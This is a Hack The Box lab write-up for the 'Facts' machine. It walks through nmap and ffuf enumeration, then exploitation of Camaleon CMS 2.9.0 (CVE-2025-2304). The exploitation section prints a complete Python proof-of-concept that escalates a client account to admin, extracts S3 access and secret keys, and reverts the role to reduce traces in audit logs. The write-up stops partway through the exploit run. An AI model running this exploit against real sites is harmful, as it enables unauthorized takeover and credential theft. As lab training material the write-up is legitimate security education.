---
tags:
  - SN_10
link: https://app.hackthebox.com/machines/Facts
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/bdcd209c32f156fbfb2268f099971f75.png
solve date: 2026-02-15
solved: true
---
## Summary
<div align="center"><br><img width="" src="Facts.png" alt=""><br></div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery

### 1.1 Connecting to the HTB VPN

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2. Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

Command: `ping -c 4 TARGET_IP`

Breakdown:
- `-c 4` → sends 4 packets only (clean output, fast)

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ ping -c 4 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from 10.129.4.179: icmp_seq=1 ttl=63 time=276 ms
64 bytes from 10.129.4.179: icmp_seq=2 ttl=63 time=279 ms
64 bytes from 10.129.4.179: icmp_seq=3 ttl=63 time=277 ms
64 bytes from 10.129.4.179: icmp_seq=4 ttl=63 time=283 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3015ms
rtt min/avg/max/mdev = 276.453/278.758/282.843/2.585 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1. Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1. The "Spearfishing" Scan (All Ports, High Speed)

Command: `nmap -p- --min-rate 5000 -Pn TARGET_IP`

Breakdown:
- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This drastically reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 08:46 -0500
Warning: TARGET_IP giving up on port because retransmission cap hit (10).
Nmap scan report for TARGET_IP
Host is up (0.28s latency).
Not shown: 65513 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
217/tcp   filtered dbase
3615/tcp  filtered start-network
7949/tcp  filtered unknown
9950/tcp  filtered apc-9950
12724/tcp filtered unknown
13122/tcp filtered unknown
17541/tcp filtered unknown
18737/tcp filtered unknown
18903/tcp filtered unknown
34584/tcp filtered unknown
34618/tcp filtered unknown
36754/tcp filtered unknown
38375/tcp filtered unknown
42612/tcp filtered unknown
42776/tcp filtered unknown
43615/tcp filtered unknown
54321/tcp open     unknown
59307/tcp filtered unknown
61782/tcp filtered unknown
64434/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 34.82 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2. The "Deep Dive" Scan (Targeted Aggression)

Command: `nmap -A -p p1,p2,p3,p4 TARGET_IP`

Breakdown:
- `-sC`
    - **Description:** Default Script Scan.
    - **Purpose:** Runs a collection built-in Nmap Scripting Engine (NSE) scripts to find common vulnerabilities, metadata, or hidden info.
- `-sV`
    - **Description:** Version Detection.
    - **Purpose:** Probes open ports to determine what software and version are actually running (e.g., identifying "Jetty" or "OpenSSH 9.2").
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


Output:

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80,54321 TARGET_IP      
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 08:48 -0500
Nmap scan report for TARGET_IP
Host is up (0.26s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1896E4521768128A
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 23 Feb 2026 13:49:04 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>1896E4521768128A</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1896E44CFEA01D99
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 23 Feb 2026 13:48:42 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1896E44CFEA01D99</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Mon, 23 Feb 2026 13:48:43 GMT
|_    Content-Length: 0
|_http-server-header: MinIO
|_http-title: Did not follow redirect to http://TARGET_IP:9001
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.98%I=7%D=2/23%Time=699C5ABA%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nAc
SF:cept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20app
SF:lication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max-a
SF:ge=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x20
SF:dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX-A
SF:mz-Request-Id:\x201896E44CFEA01D99\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2023\x20Fe
SF:b\x202026\x2013:48:42\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20encod
SF:ing=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\x2
SF:0Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><Req
SF:uestId>1896E44CFEA01D99</RequestId><HostId>dd9025bab4ad464b049177c95eb6
SF:ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions,5
SF:9,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Mon,\x2023\x20
SF:Feb\x202026\x2013:48:43\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\.0\x2
SF:0400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x2
SF:0303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nStrict-
SF:Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nVary:\
SF:x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af
SF:9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x201896E4521768128A\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\
SF:r\nDate:\x20Mon,\x2023\x20Feb\x202026\x2013:49:04\x20GMT\r\n\r\n<\?xml\
SF:x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>InvalidReque
SF:st</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</Messag
SF:e><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId>1896
SF:E4521768128A</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3f
SF:d1af9251148b658df7ac2e3e8</HostId></Error>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   261.62 ms 10.10.14.1
2   261.63 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.28 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3. Scan Results Analysis

| **Service**       | **Version**             | **Analysis**                                                                                                                                                                                                        |
| ----------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SSH** (22)      | OpenSSH 9.9p1           | Low Priority. Standard SSH service running on **Ubuntu Linux**. The version is quite recent, suggesting the OS is likely Ubuntu 24.04 or similar. No immediate low-hanging fruit here.                              |
| **HTTP** (80)     | nginx 1.26.3            | Web server that forces a redirect to `http://facts.htb/`. This confirms we need to perform **Virtual Host mapping** in our `/etc/hosts` file to access the site content.                                            |
| **MinIO** (54321) | Golang net/http (MinIO) | An object storage service (S3-compatible). Nmap detected a redirect to port **9001**, which is typically the **MinIO Console (GUI)**. The 400 error leak mentioned a resource path: `/nice ports,/Trinity.txt.bak`. |

When you see `Did not follow redirect to http://facts.htb/` in Nmap, the server is essentially saying:

"I know you're at `TARGET_IP`, but I am configured to only talk to people who call me `facts.htb`."

This is a **301 (Permanent)** or **302 (Found)** redirect. Browsers follow this automatically, but Nmap just reports it. If the name isn't in your `/etc/hosts`, the browser follows the redirect into a "Dead End."
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2. Enumeration of Web Services

#### 2.2.1. Update Hosts File

Command: `sudo sh -c 'echo "TARGET_IP facts.htb" >> /etc/hosts'`

Breakdown:

- **`sudo`**
    - **Description:** Superuser Do.
    - **Purpose:** Executes the subsequent command with root privileges. This is required because `/etc/hosts` is a system-protected file that ordinary users cannot modify.
- **`sh -c`**
    - **Description:** Shell Command String.
    - **Purpose:** Tells the system to run a new shell instance and execute the string inside the single quotes. This is used here because the redirection (`>>`) needs root privileges to write to the file; simply using `sudo echo ... >> /etc/hosts` would fail because the redirection is handled by your current (unprivileged) shell.
- **`echo "TARGET_IP facts.htb"`**
    - **Description:** Standard Output Generator. 
    - **Purpose:** Creates a string containing the IP address and the desired domain name, which acts as a local DNS entry.
- **`>>`**
    - **Description:** Append Redirection.
    - **Purpose:** Directs the output of the `echo` command to the end of a file. Using `>>` (append) instead of `>` (overwrite) ensures you don't accidentally delete your existing host mappings.
- **`/etc/hosts`**
    - **Description:** Static Host Lookup Table.
    - **Purpose:** The target file where the operating system looks first to resolve hostnames to IP addresses before querying external DNS servers.
<div align="center">
<br>
<br>
</div>

##### How Hostname Resolution Works

When you type a URL like `google.com` or `facts.htb` into your browser, your computer needs to translate that text into a numerical IP address. It follows a specific order of operations:

1. **The Browser Cache:** Your browser checks if it already knows the IP from a previous visit.
2. **The Hosts File (`/etc/hosts`):** This is your computer's "private address book." It checks here **first** before asking the internet. If an entry exists, it stops looking and goes to that IP.
3. **DNS Servers:** If the name isn't in your private book, your computer asks a DNS server (like Google’s `8.8.8.8` or your ISP).

##### Why `google.com` works but `facts.htb` doesn't

- **Public Sites:** `google.com` is registered on public DNS servers. When you ask the internet "Where is Google?", the internet has an official answer.

- **HTB Sites:** `facts.htb` is a **private domain** inside the HTB lab environment. Public DNS servers have no idea it exists. Because your computer can't find an "official" record, it gives you a "Server Not Found" error—unless you write the address into your private address book (`/etc/hosts`) yourself.
<div align="center">
<br>
<br>
</div>

#### 2.2.2. Web Enumeration

Browse to `http://facts.htb`.

![[Pasted image 20260215184146.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.3. Directory Fuzzing

Command: `ffuf -w /usr/share/wordlists/dirb/common.txt -u http://facts.htb/FUZZ`

Breakdown:

- **`-u`**
    - **Description:** Target URL.
    - **Purpose:** Specifies the URL to be fuzzed. The keyword `FUZZ` tells the tool exactly where to inject the words from your wordlist.
- **`-w`**
    - **Description:** Wordlist Path.
    - **Purpose:** Provides the list of common directory and file names (like `admin`, `config`, etc.) to test against the server.

Output:

```shell
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://facts.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11098, Words: 1328, Lines: 125, Duration: 372ms]
.profile                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 437ms]
.bash_history           [Status: 200, Size: 11137, Words: 1328, Lines: 125, Duration: 547ms]
.bashrc                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 574ms]
.rhosts                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 698ms]
.sh_history             [Status: 200, Size: 11131, Words: 1328, Lines: 125, Duration: 724ms]
.cvs                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 901ms]
.cache                  [Status: 200, Size: 11116, Words: 1328, Lines: 125, Duration: 902ms]
.config                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 1012ms]
.ssh                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1080ms]
.htaccess               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1204ms]
.listings               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1271ms]
.svn                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1418ms]
.passwd                 [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 1488ms]
.subversion             [Status: 200, Size: 11131, Words: 1328, Lines: 125, Duration: 1550ms]
.hta                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1561ms]
.cvsignore              [Status: 200, Size: 11128, Words: 1328, Lines: 125, Duration: 1716ms]
.swf                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1864ms]
.mysql_history          [Status: 200, Size: 11140, Words: 1328, Lines: 125, Duration: 2043ms]
.history                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2051ms]
.web                    [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2172ms]
.forward                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 1209ms]
.perf                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2806ms]
.htpasswd               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1019ms]
.listing                [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 3241ms]
400                     [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 2147ms]
404                     [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 2014ms]
500                     [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 2058ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2047ms]
admin.cgi               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2126ms]
admin.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2013ms]
admin.pl                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1994ms]
ajax                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2918ms]
cache                   [Status: 200, Size: 11116, Words: 1328, Lines: 125, Duration: 2601ms]
captcha                 [Status: 200, Size: 5576, Words: 16, Lines: 14, Duration: 3136ms]
config                  [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 2646ms]
cvs                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2555ms]
CVS                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2526ms]
en                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 2140ms]
error                   [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 2264ms]
forward                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2010ms]
history                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2177ms]
hta                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1763ms]
htpasswd                [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 1950ms]
index.php               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2269ms]
index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2263ms]
index.html              [Status: 200, Size: 11128, Words: 1328, Lines: 125, Duration: 2162ms]
index.htm               [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2118ms]
Index                   [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 2576ms]
listing                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 2149ms]
listings                [Status: 200, Size: 11125, Words: 1328, Lines: 125, Duration: 2175ms]
page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 3227ms]
passwd                  [Status: 200, Size: 11119, Words: 1328, Lines: 125, Duration: 3174ms]
perf                    [Status: 200, Size: 11113, Words: 1328, Lines: 125, Duration: 1301ms]
post                    [Status: 200, Size: 11308, Words: 1414, Lines: 152, Duration: 2327ms]
profile                 [Status: 200, Size: 11122, Words: 1328, Lines: 125, Duration: 1948ms]
robots.txt              [Status: 200, Size: 99, Words: 12, Lines: 2, Duration: 2041ms]
robots                  [Status: 200, Size: 33, Words: 2, Lines: 1, Duration: 2113ms]
rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 2380ms]
search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 3275ms]
sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 2742ms]
sitemap.xml             [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 2390ms]
sitemap.gz              [Status: 500, Size: 7918, Words: 1035, Lines: 115, Duration: 2539ms]
ssh                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 1891ms]
svn                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2477ms]
swf                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2566ms]
up                      [Status: 200, Size: 73, Words: 4, Lines: 1, Duration: 2190ms]
web                     [Status: 200, Size: 11110, Words: 1328, Lines: 125, Duration: 2363ms]
welcome                 [Status: 200, Size: 11966, Words: 1481, Lines: 130, Duration: 3278ms]
:: Progress: [4614/4614] :: Job [1/1] :: 16 req/sec :: Duration: [0:04:42] :: Errors: 0 ::
```

The most interesting hit is `/admin`
<div align="center">
<br>
<br>
</div>

#### 2.2.4. Visit the Admin Page

![[Pasted image 20260224152519.png]]

Create an account and login:

![[Pasted image 20260224153439.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.5 Vulnerability Research & Exploit Identification

The dashboard footer explicitly identifies the site as running **Camaleon CMS version 2.9.0**. With this information, we can search for known weaknesses that could lead to a compromise.

Search online for "`Camaleon CMS 2.9.0 exploit`." The exploit is CVE-2025–2304 and the next step is to find or develop a **Proof of Concept** to verify if the `facts.htb` instance is truly susceptible.

Repository found: Camaleon CMS 2.9.0 – Authenticated Privilege Escalation (Role Change) + Optional S3 Config Leak.[^1]
![[Pasted image 20260224155252.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1. Exploit Acquisition and Preparation

Clone the repository from GitHub to your local attack machine.

Command: `git clone https://github.com/Alien0ne/CVE-2025-2304`

Breakdown:

- **`git clone`**
    - **Description:** Repository Cloning Tool.
    - **Purpose:** Copies the entire remote project, including scripts and documentation, from GitHub to a local directory on your machine.
- **`https://github.com/Alien0ne/CVE-2025-2304`**
    - **Description:** Remote Source URL.
    - **Purpose:** Points to the specific repository containing the exploit code for the Camaleon CMS vulnerability.

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ git clone https://github.com/Alien0ne/CVE-2025-2304.git
Cloning into 'CVE-2025-2304'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 8.83 KiB | 1.10 MiB/s, done.
Resolving deltas: 100% (3/3), done.

┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ cd CVE-2025-2304 ; ls              
exploit.py  README.md
```

Poc Audit:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ cat exploit.py
```

```python
#Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)

import argparse
import requests
import re
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="URL")
parser.add_argument("-U", "--username", required=True, help="Username")
parser.add_argument("-P", "--password", required=True, help="Password")
parser.add_argument("--newpass", default="test", help="New password to set")
parser.add_argument("-e", "--extract", action="store_true", help="Extract AWS Secrets")
parser.add_argument("-r", "--revert", action="store_true",help="Revert role back to client after escalation")

args = parser.parse_args()

print("[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)")

s = requests.Session()

#-------Login-------

r = s.get(f"{args.url}/admin/login")

#CSRF Extraction
m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]*)"',r.text)
csrf=m.group(1)
#print(f"Login CSRF extracted: {csrf}")

#Login Post Req
data={
    "authenticity_token":csrf,
    "user[username]": args.username,
    "user[password]": args.password
}

r = s.post(f"{args.url}/admin/login", data=data)
if "/admin/logout" in r.text:
    print("[+]Login confirmed")
else:
    print("[-]Login failed")
    exit()

#Profile Edit GET Req

r = s.get(f"{args.url}/admin/profile/edit")

m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*',r.text)
csrf=m.group(1)
#print(f"Login CSRF extracted: {csrf}")

m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
user_id = m.group(1)
print(f"   User ID: {user_id}")

'''m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_email"[^>]*',r.text)
user_email = m.group(1)
print(f"User Email: {user_email}")'''

m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
user_role = m.group(1)
print(f"   Current User Role: {user_role}")

print("[+]Loading PPRIVILEGE ESCALATION")

#PPRIVILEGE ESCALATION

data={
    "_method":"patch",
    "authenticity_token":csrf,
    "password[password]": args.newpass,
    "password[password_confirmation]": args.newpass,
    "password[role]": "admin"
}

headers={
    "X-CSRF-Token":csrf,
    "X-Requested-With": "XMLHttpRequest"
}

r = s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)

#Role Verification

r = s.get(f"{args.url}/admin/profile/edit")

m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
user_id = m.group(1)
print(f"   User ID: {user_id}")

m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
updated_user_role = m.group(1)
print(f"   Updated User Role: {updated_user_role}")

if args.extract:
    print("[+]Extracting S3 Credentials")

    r = s.get(f"{args.url}/admin/settings/site")

    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_access_key[^>]*',r.text)
    s3_access_key = m.group(1)
    print(f"   s3 access key: {s3_access_key}")

    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_secret_key[^>]*',r.text)
    s3_secret_key = m.group(1)
    print(f"   s3 secret key: {s3_secret_key}")

    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*options_filesystem_s3_endpoint[^>]*',r.text)
    s3_endpoint = m.group(1)
    print(f"   s3 endpoint: {s3_endpoint}")

#Reverting users Role

print("[+]Reverting User Role")
if args.revert:
    r = s.get(f"{args.url}/admin/profile/edit")

    m = re.search(r'<meta name="csrf-token" content="([^"]*)"[^>]*',r.text)
    csrf=m.group(1)

    data={
        "_method":"patch",
        "authenticity_token":csrf,
        "password[password]": args.newpass,
        "password[password_confirmation]": args.newpass,
        "password[role]": user_role
    }

    headers={
        "X-CSRF-Token":csrf,
        "X-Requested-With": "XMLHttpRequest"
    }

    r = s.post(f"{args.url}/admin/users/{user_id}/updated_ajax", data=data, headers=headers)

    #Role Verification

    r = s.get(f"{args.url}/admin/profile/edit")

    m = re.search(r'<input[^>]*value="([^"]*)"[^>]*id="user_id"[^>]*',r.text)
    user_id = m.group(1)
    print(f"   User ID: {user_id}")

    m = re.search(r'<option selected="selected" value="([^"]*)">',r.text)
    user_role = m.group(1)
    print(f"   User Role: {user_role}")
```
<div align="center">
<br>
<br>
</div>

### 3.2 Executing `exploit.py`

Command: `python3 exploit.py -u http://facts.htb -U username -P password --newpass password -e -r`

Breakdown:

- **`-U username`**
    - **Description:** Authenticated Username.
    - **Purpose:** Provides the script with the username of the account I manually registered to initiate the session.
- **`-P password`**
    - **Description:** Authenticated Password.
    - **Purpose:** Provides the current password for the account to complete the login handshake.
- **`--newpass password`**
    - **Description:** Password Synchronization.
    - **Purpose:** Ensures that during the profile update (which is part of the escalation exploit), the password remains `password`. This prevents the script from defaulting to `test` and potentially locking me out of my own account.
- **`-e`**
    - **Description:** Configuration Extraction Flag.
    - **Purpose:** Triggers the post-exploitation module to navigate to the Camaleon CMS settings page and harvest the S3 access keys.
- **`-r`**
    - **Description:** Role Reversion Flag.
    - **Purpose:** Automatically downgrades the user from "admin" back to "client" after the keys are stolen, reducing the "noise" left in the application's audit logs.

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ python3 exploit.py -u http://facts.htb -U username -P password --newpass password -e -r  
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 5
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
